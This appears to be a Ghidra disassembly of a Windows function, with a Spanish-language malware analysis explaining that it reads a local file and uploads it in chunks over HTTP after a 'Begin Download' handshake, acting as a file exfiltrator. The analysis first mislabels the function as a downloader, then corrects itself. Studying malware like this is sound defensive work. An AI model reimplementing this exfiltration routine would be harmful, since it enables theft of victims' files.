```
                             
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             bool __stdcall FUN_00401106(undefined4 param_1, char * p
                               assume FS_OFFSET = 0xffdff000
             bool              AL:1           <RETURN>
             undefined4        Stack[0x4]:4   param_1                                 XREF[6]:     0040117a(R),
                                                                                                   00401204(R),
                                                                                                   00401259(R),
                                                                                                   0040128c(R),
                                                                                                   004012df(R),
                                                                                                   0040130e(R)
             char *            Stack[0x8]:4   param_2                                 XREF[2]:     0040113d(R),
                                                                                                   004011ac(R)
             int               Stack[0xc]:4   param_3                                 XREF[2]:     00401124(R),
                                                                                                   004011c6(R)
             undefined4        Stack[-0x8]:4  local_8                                 XREF[7]:     00401140(W),
                                                                                                   004012cb(R),
                                                                                                   004012dc(R),
                                                                                                   004012f3(R),
                                                                                                   004012f8(R),
                                                                                                   00401324(R),
                                                                                                   00401329(R)
             undefined4        Stack[-0xc]:4  local_c                                 XREF[5]:     00401156(W),
                                                                                                   004012bc(R),
                                                                                                   004012c5(R),
                                                                                                   00401301(R),
                                                                                                   00401332(R)
             undefined4        Stack[-0x10]:4 local_10                                XREF[5]:     004011a9(W),
                                                                                                   004011d2(R),
                                                                                                   0040129f(R),
                                                                                                   004012ac(R),
                                                                                                   004012ee(R)
             undefined4        Stack[-0x14]:4 local_14                                XREF[2]:     00401112(W),
                                                                                                   00401242(R)
             undefined4        Stack[-0x18]:4 local_18                                XREF[2]:     0040112e(W),
                                                                                                   004012af(R)
             undefined1        Stack[-0x1c]:1 local_1c                                XREF[1]:     0040123f(*)
             undefined1        Stack[-0x20]:1 local_20                                XREF[1]:     004012d7(*)
             undefined1        Stack[-0x44]:1 local_44                                XREF[1]:     0040111c(*)
             undefined4        Stack[-0x48]:4 local_48                                XREF[3]:     0040111f(W),
                                                                                                   00401143(W),
                                                                                                   00401287(*)
             undefined1        Stack[-0x6c]:1 local_6c                                XREF[3]:     00401163(*),
                                                                                                   00401168(*),
                                                                                                   00401174(*)
             undefined1        Stack[-0x46b   local_46b                               XREF[1]:     004011c0(*)
             undefined1        Stack[-0x46c   local_46c                               XREF[4]:     004011c9(W),
                                                                                                   004011d9(*),
                                                                                                   004011eb(*),
                                                                                                   004011fb(*)
             undefined1        Stack[-0x86b   local_86b                               XREF[1]:     0040122e(*)
             undefined1        Stack[-0x86c   local_86c                               XREF[3]:     00401234(W),
                                                                                                   00401246(*),
                                                                                                   00401269(*)
             undefined1        Stack[-0xc6b   local_c6b                               XREF[1]:     00401219(*)
             undefined1        Stack[-0xc6c   local_c6c                               XREF[2]:     0040121f(W),
                                                                                                   00401252(*)
             undefined4        Stack[-0xc7c   local_c7c                               XREF[1]:     00401136(*)
                             FUN_00401106                                    XREF[1]:     FUN_004014f4:00401987(c)
        00401106 55              PUSH       EBP
        00401107 8b ec           MOV        EBP,ESP
        00401109 81 ec 68        SUB        ESP,0xc68
                 0c 00 00
        0040110f 53              PUSH       EBX
        00401110 56              PUSH       ESI
        00401111 57              PUSH       EDI
        00401112 89 4d f0        MOV        dword ptr [EBP + local_14],ECX
        00401115 6a 09           PUSH       0x9                                              char * _Mode for fopen
        00401117 33 db           XOR        EBX,EBX
        00401119 59              POP        ECX
        0040111a 33 c0           XOR        EAX,EAX
        0040111c 8d 7d c0        LEA        EDI=>local_44,[EBP + -0x40]
        0040111f 89 5d bc        MOV        dword ptr [EBP + local_48],EBX
        00401122 f3 ab           STOSD.REP  ES:EDI
        00401124 8b 45 10        MOV        EAX,dword ptr [EBP + param_3]
        00401127 69 c0 f4        IMUL       EAX,EAX,0x1f4
                 01 00 00
        0040112d 50              PUSH       EAX                                              uint param_1 for operator_new
        0040112e 89 45 ec        MOV        dword ptr [EBP + local_18],EAX
        00401131 e8 c2 0a        CALL       MSVCRT.DLL::operator_new                         void * operator_new(uint param_1)
                 00 00
        00401136 c7 04 24        MOV        dword ptr [ESP]=>local_c7c,DAT_00403108          = 72h    r
                 08 31 40 00
        0040113d ff 75 0c        PUSH       dword ptr [EBP + param_2]                        char * _Filename for fopen
        00401140 89 45 fc        MOV        dword ptr [EBP + local_8],EAX
        00401143 c7 45 bc        MOV        dword ptr [EBP + local_48],0x28
                 28 00 00 00
        0040114a ff 15 78        CALL       dword ptr [->MSVCRT.DLL::fopen]                  = 0000243a
                 20 40 00
        00401150 8b f0           MOV        ESI,EAX
        00401152 59              POP        ECX
        00401153 3b f3           CMP        ESI,EBX
        00401155 59              POP        ECX
        00401156 89 75 f8        MOV        dword ptr [EBP + local_c],ESI
        00401159 75 3b           JNZ        LAB_00401196
        0040115b 6a 08           PUSH       0x8
        0040115d be e4 30        MOV        ESI,s_Could_not_open_file_for_reading_004030e4   = "Could not open file for readi
                 40 00
        00401162 59              POP        ECX
        00401163 8d 7d 98        LEA        EDI=>local_6c,[EBP + -0x68]
        00401166 f3 a5           MOVSD.REP  ES:EDI,ESI=>s_Could_not_open_file_for_reading_   = "Could not open file for readi
        00401168 8d 45 98        LEA        EAX=>local_6c,[EBP + -0x68]
        0040116b 50              PUSH       EAX                                              char * _Str for strlen
        0040116c a4              MOVSB      ES:EDI,ESI=>s_Could_not_open_file_for_reading_   = "Could not open file for readi
        0040116d e8 6e 0a        CALL       MSVCRT.DLL::strlen                               size_t strlen(char * _Str)
                 00 00
        00401172 59              POP        ECX
        00401173 50              PUSH       EAX
        00401174 8d 45 98        LEA        EAX=>local_6c,[EBP + -0x68]
        00401177 50              PUSH       EAX
        00401178 53              PUSH       EBX
        00401179 53              PUSH       EBX
        0040117a ff 75 08        PUSH       dword ptr [EBP + param_1]
        0040117d ff 15 c8        CALL       dword ptr [->WININET.DLL::HttpSendRequestA]      = 0000231c
                 20 40 00
        00401183 85 c0           TEST       EAX,EAX
        00401185 75 08           JNZ        LAB_0040118f
        00401187 53              PUSH       EBX                                              FILE * _File for fclose
                             LAB_00401188                                    XREF[1]:     00401335(j)
        00401188 ff 15 74        CALL       dword ptr [->MSVCRT.DLL::fclose]                 = 00002430
                 20 40 00
        0040118e 59              POP        ECX
                             LAB_0040118f                                    XREF[4]:     00401185(j), 0040120f(j),
                                                                                          00401263(j), 00401297(j)
        0040118f 33 c0           XOR        EAX,EAX
        00401191 e9 87 01        JMP        LAB_0040131d
                 00 00
                             LAB_00401196                                    XREF[1]:     00401159(j)
        00401196 6a 02           PUSH       0x2                                              int _Origin for fseek
        00401198 53              PUSH       EBX                                              long _Offset for fseek
        00401199 56              PUSH       ESI                                              FILE * _File for fseek
        0040119a ff 15 70        CALL       dword ptr [->MSVCRT.DLL::fseek]                  = 00002428
                 20 40 00
        004011a0 56              PUSH       ESI                                              FILE * _File for ftell
        004011a1 ff 15 6c        CALL       dword ptr [->MSVCRT.DLL::ftell]                  = 00002420
                 20 40 00
        004011a7 6a 5c           PUSH       0x5c                                             int _Ch for strrchr
        004011a9 89 45 f4        MOV        dword ptr [EBP + local_10],EAX
        004011ac ff 75 0c        PUSH       dword ptr [EBP + param_2]                        char * _Str for strrchr
        004011af ff 15 68        CALL       dword ptr [->MSVCRT.DLL::strrchr]                = 00002416
                 20 40 00
        004011b5 be ff 00        MOV        ESI,0xff
                 00 00
        004011ba 8b d0           MOV        EDX,EAX
        004011bc 8b ce           MOV        ECX,ESI
        004011be 33 c0           XOR        EAX,EAX
        004011c0 8d bd 99        LEA        EDI=>local_46b,[EBP + 0xfffffb99]
                 fb ff ff
        004011c6 ff 75 10        PUSH       dword ptr [EBP + param_3]
        004011c9 88 9d 98        MOV        byte ptr [EBP + local_46c],BL
                 fb ff ff
        004011cf 42              INC        EDX
        004011d0 f3 ab           STOSD.REP  ES:EDI
        004011d2 ff 75 f4        PUSH       dword ptr [EBP + local_10]
        004011d5 66 ab           STOSW      ES:EDI
        004011d7 aa              STOSB      ES:EDI
        004011d8 52              PUSH       EDX
        004011d9 8d 85 98        LEA        EAX=>local_46c,[EBP + 0xfffffb98]
                 fb ff ff
        004011df 68 b8 30        PUSH       s_D-o-w-n-l-o-a-d-f-i-l-e%s******%_004030b8      char * _Format for sprintf
                 40 00
        004011e4 50              PUSH       EAX                                              char * _Dest for sprintf
        004011e5 ff 15 64        CALL       dword ptr [->MSVCRT.DLL::sprintf]                = 0000240c
                 20 40 00
        004011eb 8d 85 98        LEA        EAX=>local_46c,[EBP + 0xfffffb98]
                 fb ff ff
        004011f1 50              PUSH       EAX                                              char * _Str for strlen
        004011f2 e8 e9 09        CALL       MSVCRT.DLL::strlen                               size_t strlen(char * _Str)
                 00 00
        004011f7 83 c4 30        ADD        ESP,0x30
        004011fa 50              PUSH       EAX
        004011fb 8d 85 98        LEA        EAX=>local_46c,[EBP + 0xfffffb98]
                 fb ff ff
        00401201 50              PUSH       EAX
        00401202 53              PUSH       EBX
        00401203 53              PUSH       EBX
        00401204 ff 75 08        PUSH       dword ptr [EBP + param_1]
        00401207 ff 15 c8        CALL       dword ptr [->WININET.DLL::HttpSendRequestA]      = 0000231c
                 20 40 00
        0040120d 85 c0           TEST       EAX,EAX
        0040120f 0f 84 7a        JZ         LAB_0040118f
                 ff ff ff
        00401215 8b ce           MOV        ECX,ESI
        00401217 33 c0           XOR        EAX,EAX
        00401219 8d bd 99        LEA        EDI=>local_c6b,[EBP + 0xfffff399]
                 f3 ff ff
        0040121f 88 9d 98        MOV        byte ptr [EBP + local_c6c],BL
                 f3 ff ff
        00401225 f3 ab           STOSD.REP  ES:EDI
        00401227 66 ab           STOSW      ES:EDI
        00401229 aa              STOSB      ES:EDI
        0040122a 8b ce           MOV        ECX,ESI
        0040122c 33 c0           XOR        EAX,EAX
        0040122e 8d bd 99        LEA        EDI=>local_86b,[EBP + 0xfffff799]
                 f7 ff ff
        00401234 88 9d 98        MOV        byte ptr [EBP + local_86c],BL
                 f7 ff ff
        0040123a f3 ab           STOSD.REP  ES:EDI
        0040123c 66 ab           STOSW      ES:EDI
        0040123e aa              STOSB      ES:EDI
        0040123f 8d 45 e8        LEA        EAX=>local_1c,[EBP + -0x18]
        00401242 8b 4d f0        MOV        ECX,dword ptr [EBP + local_14]
        00401245 50              PUSH       EAX
        00401246 8d 85 98        LEA        EAX=>local_86c,[EBP + 0xfffff798]
                 f7 ff ff
        0040124c 68 ff 03        PUSH       0x3ff
                 00 00
        00401251 50              PUSH       EAX
        00401252 8d 85 98        LEA        EAX=>local_c6c,[EBP + 0xfffff398]
                 f3 ff ff
        00401258 50              PUSH       EAX
        00401259 ff 75 08        PUSH       dword ptr [EBP + param_1]
        0040125c e8 1b fe        CALL       FUN_0040107c                                     undefined4 FUN_0040107c(undefine
                 ff ff
        00401261 84 c0           TEST       AL,AL
        00401263 0f 84 26        JZ         LAB_0040118f
                 ff ff ff
        00401269 8d 85 98        LEA        EAX=>local_86c,[EBP + 0xfffff798]
                 f7 ff ff
        0040126f 68 a8 30        PUSH       s_Begin_Download_004030a8                        char * _Str2 for strcmp
                 40 00
        00401274 50              PUSH       EAX                                              char * _Str1 for strcmp
        00401275 e8 78 09        CALL       MSVCRT.DLL::strcmp                               int strcmp(char * _Str1, char *
                 00 00
        0040127a 59              POP        ECX
        0040127b 85 c0           TEST       EAX,EAX
        0040127d 59              POP        ECX
        0040127e 0f 85 ae        JNZ        LAB_00401332
                 00 00 00
        00401284 53              PUSH       EBX
        00401285 6a 08           PUSH       0x8
        00401287 8d 45 bc        LEA        EAX=>local_48,[EBP + -0x44]
        0040128a 53              PUSH       EBX
        0040128b 50              PUSH       EAX
        0040128c ff 75 08        PUSH       dword ptr [EBP + param_1]
        0040128f ff 15 cc        CALL       dword ptr [->WININET.DLL::HttpSendRequestExA]    = 00002306
                 20 40 00
        00401295 85 c0           TEST       EAX,EAX
        00401297 0f 84 f2        JZ         LAB_0040118f
                 fe ff ff
        0040129d 33 ff           XOR        EDI,EDI
        0040129f 39 5d f4        CMP        dword ptr [EBP + local_10],EBX
        004012a2 74 4f           JZ         LAB_004012f3
                             LAB_004012a4                                    XREF[1]:     004012f1(j)
        004012a4 6a 05           PUSH       0x5                                              DWORD dwMilliseconds for Sleep
        004012a6 ff 15 00        CALL       dword ptr [->KERNEL32.DLL::Sleep]                = 00002248
                 20 40 00
        004012ac 8b 45 f4        MOV        EAX,dword ptr [EBP + local_10]
        004012af 8b 75 ec        MOV        ESI,dword ptr [EBP + local_18]
        004012b2 2b c7           SUB        EAX,EDI
        004012b4 3b c6           CMP        EAX,ESI
        004012b6 77 02           JA         LAB_004012ba
        004012b8 8b f0           MOV        ESI,EAX
                             LAB_004012ba                                    XREF[1]:     004012b6(j)
        004012ba 53              PUSH       EBX                                              int _Origin for fseek
        004012bb 57              PUSH       EDI                                              long _Offset for fseek
        004012bc ff 75 f8        PUSH       dword ptr [EBP + local_c]                        FILE * _File for fseek
        004012bf ff 15 70        CALL       dword ptr [->MSVCRT.DLL::fseek]                  = 00002428
                 20 40 00
        004012c5 ff 75 f8        PUSH       dword ptr [EBP + local_c]                        FILE * _File for fread
        004012c8 56              PUSH       ESI                                              size_t _Count for fread
        004012c9 6a 01           PUSH       0x1                                              size_t _ElementSize for fread
        004012cb ff 75 fc        PUSH       dword ptr [EBP + local_8]                        void * _DstBuf for fread
        004012ce ff 15 5c        CALL       dword ptr [->MSVCRT.DLL::fread]                  = 000023fa
                 20 40 00
        004012d4 83 c4 1c        ADD        ESP,0x1c
        004012d7 8d 45 e4        LEA        EAX=>local_20,[EBP + -0x1c]
        004012da 50              PUSH       EAX
        004012db 56              PUSH       ESI
        004012dc ff 75 fc        PUSH       dword ptr [EBP + local_8]
        004012df ff 75 08        PUSH       dword ptr [EBP + param_1]
        004012e2 ff 15 d0        CALL       dword ptr [->WININET.DLL::InternetWriteFile]     = 000022f2
                 20 40 00
        004012e8 85 c0           TEST       EAX,EAX
        004012ea 74 38           JZ         LAB_00401324
        004012ec 03 fe           ADD        EDI,ESI
        004012ee 39 7d f4        CMP        dword ptr [EBP + local_10],EDI
        004012f1 75 b1           JNZ        LAB_004012a4
                             LAB_004012f3                                    XREF[1]:     004012a2(j)
        004012f3 39 5d fc        CMP        dword ptr [EBP + local_8],EBX
        004012f6 74 09           JZ         LAB_00401301
        004012f8 ff 75 fc        PUSH       dword ptr [EBP + local_8]                        void * param_1 for operator_delete
        004012fb e8 ec 08        CALL       MSVCRT.DLL::operator_delete                      void operator_delete(void * para
                 00 00
        00401300 59              POP        ECX
                             LAB_00401301                                    XREF[1]:     004012f6(j)
        00401301 ff 75 f8        PUSH       dword ptr [EBP + local_c]                        FILE * _File for fclose
        00401304 ff 15 74        CALL       dword ptr [->MSVCRT.DLL::fclose]                 = 00002430
                 20 40 00
        0040130a 59              POP        ECX
        0040130b 53              PUSH       EBX
        0040130c 53              PUSH       EBX
        0040130d 53              PUSH       EBX
        0040130e ff 75 08        PUSH       dword ptr [EBP + param_1]
        00401311 ff 15 d4        CALL       dword ptr [->WININET.DLL::HttpEndRequestA]       = 000022e0
                 20 40 00
        00401317 f7 d8           NEG        EAX
        00401319 1b c0           SBB        EAX,EAX
        0040131b f7 d8           NEG        EAX
                             LAB_0040131d                                    XREF[1]:     00401191(j)
        0040131d 5f              POP        EDI
        0040131e 5e              POP        ESI
        0040131f 5b              POP        EBX
        00401320 c9              LEAVE
        00401321 c2 0c 00        RET        0xc
                             LAB_00401324                                    XREF[1]:     004012ea(j)
        00401324 39 5d fc        CMP        dword ptr [EBP + local_8],EBX
        00401327 74 09           JZ         LAB_00401332
        00401329 ff 75 fc        PUSH       dword ptr [EBP + local_8]                        void * param_1 for operator_delete
        0040132c e8 bb 08        CALL       MSVCRT.DLL::operator_delete                      void operator_delete(void * para
                 00 00
        00401331 59              POP        ECX
                             LAB_00401332                                    XREF[2]:     0040127e(j), 00401327(j)
        00401332 ff 75 f8        PUSH       dword ptr [EBP + local_c]
        00401335 e9 4e fe        JMP        LAB_00401188
                 ff ff
```


**La función FUN_00401106 implementa una descarga encubierta de archivos desde un servidor remoto usando HTTP, probablemente como parte del comportamiento de un malware downloader o dropper.**

### 🧠 Firma reconstruida
bool __stdcall FUN_00401106(HINTERNET hRequest, char *filepath, int fileId);  

Donde:
- param_1 es un manejador de conexión HTTP (HINTERNET).
- param_2 es una ruta local de archivo (por ejemplo, C:\Windows\Temp\payload.exe).
- param_3 es un identificador entero del archivo a descargar.


### 🔍 ¿Qué hace paso a paso?
🗂️ 1. Inicialización y reserva de memoria:  
- Reserva espacio para buffers y estructuras locales.
- Llama a operator_new(fileId * 0x1F4) → reserva memoria proporcional al tamaño estimado del archivo.
- Intenta abrir el archivo filepath en modo lectura binaria (fopen(filepath, "rb")).

❌ 2. Si no puede abrir el archivo (por ejemplo, no existe):  
- Copia el mensaje "Could not open file for reading" a un buffer.
- Lo envía al servidor mediante HttpSendRequestA, informando el error.
- Termina con return false.

✅ 3. Si sí puede abrir el archivo:  
- Hace fseek y ftell para obtener el tamaño del archivo.
- Obtiene el nombre base del archivo (usando strrchr para encontrar \ o /).
- Genera una cadena como:
    "Download-file%s******%d"  
    donde %s es el nombre del archivo y %d es el identificador.  
    Envía esta cadena al servidor vía HttpSendRequestA para iniciar la descarga.  

🔐 4. Espera respuesta del servidor:  
- Llama a FUN_0040107C para leer la respuesta y buscar comandos especiales entre <head> y </head>.
- Si encuentra el string "Begin Download", continúa con la transferencia.

📤 5. Subida del archivo en bloques:  Usa una combinación de:
- fseek, fread (para leer desde el archivo en disco)
- InternetWriteFile (para subir bloques de datos por HTTP)
- En bloques de hasta 0x1F4 bytes, con espera de 5 ms (Sleep(5))
- Esto sigue hasta que se haya transferido el archivo completo.

🧼 6. Limpieza:  
- Libera buffers dinámicos con operator_delete.
- Cierra el archivo (fclose).
- Llama a HttpEndRequestA para cerrar la sesión HTTP.
- Devuelve true o false dependiendo del éxito.

**🦠 Comportamiento malicioso: Esta función hace lo contrario de lo que se espera de un downloader: en lugar de recibir un archivo, envía un archivo al servidor remoto.** Es un exfiltrador de archivos.

Este comportamiento es típico en malware con capacidades de:
- Robo de archivos locales sensibles
- Filtrado de documentos, cookies, logs, etc.
- Comunicación camuflada mediante HTTP (evita cortafuegos)



**✅ Conclusión: FUN_00401106 implementa una rutina de exfiltración de archivos vía HTTP, con verificación previa del archivo y protocolo de control (<head>Begin Download</head>).** Su estructura general es:
- Abrir archivo local.
- Notificar al servidor.
- Esperar confirmación.
- Subir el contenido por bloques.
- Limpiar y cerrar conexión.
